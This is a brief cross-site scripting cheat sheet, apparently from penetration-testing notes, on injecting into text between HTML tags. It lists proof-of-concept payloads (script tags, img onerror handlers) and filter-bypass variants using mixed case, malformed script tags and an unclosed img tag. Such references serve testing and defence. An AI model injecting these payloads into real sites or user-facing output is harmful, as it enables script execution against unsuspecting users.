## XSS between HTML tags
 When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.

**EX**:
```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

### Bypass

#### Bypass case sensitive

```html
<sCrIpt>alert(1)</ScRipt>
```

#### Bypass tag blacklist

```html
<script x>
<script x>alert('XSS')<script y>
```

#### Bypass with incomplete html tag
```html
<img src='1' onerror='alert(0)' <
```
